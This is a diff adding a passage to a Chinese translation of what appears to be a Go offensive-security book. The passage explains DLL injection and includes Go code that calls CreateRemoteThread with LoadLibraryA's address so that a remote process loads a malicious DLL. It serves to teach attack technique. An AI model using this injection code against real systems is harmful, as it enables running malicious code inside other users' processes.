@@ -367,3 +367,33 @@ func GetLoadLibAddress(i *Inject) error {
 使用Windows函数`GetProcessAddress()`获取`LoadLibraryA()`内存地址（/ch-12/procInjector/winsys/inject.go）
 
 使用 `GetProcessAddress()` Windows 函数来确定调用 `CreateRemoteThread()` 函数所需的 `LoadLibraryA() `的起始内存地址。 `ProcGetProcAddress.Call()` 函数有两个参数：第一个是 `Kernel32.dll` 的句柄，其中包含`LoadLibraryA() `，第二个是从字符串"LoadLibraryA"转换来的`byte`切片。
+
+
+### 用Windows API `CreateRemoteThread` 执行恶意的DLL
+
+使用 `CreateRemoteThread()` Windows 函数针对远端进程的虚拟内存区域创建一个线程。 如果该区域恰好是 `LoadLibraryA()`，现在就可以加载并执行包含恶意 DLL 文件路径的内存区域。 看下清单12-11。
+
+```go
+func CreateRemoteThread(i *Inject) error {
+	var threadId uint32 = 0
+	var dwCreationFlags uint32 = 0
+	remoteThread, _, lastErr := ProcCreateRemoteThread.Call(
+		i.RemoteProcHandle, // HANDLE hProcess 
+		uintptr(nullRef), // LPSECURITY_ATTRIBUTES lpThreadAttributes
+		uintptr(nullRef), // SIZE_T dwStackSize
+		i.LoadLibAddr, // LPTHREAD_START_ROUTINE lpStartAddress 
+		i.Lpaddr, // LPVOID lpParameter 
+		uintptr(dwCreationFlags), // DWORD dwCreationFlags
+		uintptr(unsafe.Pointer(&threadId)), // LPDWORD lpThreadId
+	)
+	if remoteThread == 0 {
+		return errors.Wrap(lastErr, "[!] ERROR : Can't Create Remote Thread.")
+	}
+	i.RThread = remoteThread
+	fmt.Printf("[+] Thread identifier created: %v\n", unsafe.Pointer(&threadId))
+	fmt.Printf("[+] Thread handle created: %v\n", unsafe.Pointer(i.RThread))
+	return nil
+}
+```
+清单 12-11：
+使用 `CreateRemoteThread()` Windows 函数执行进程注入 （/ch-12/procInjector/winsys/inject.go）
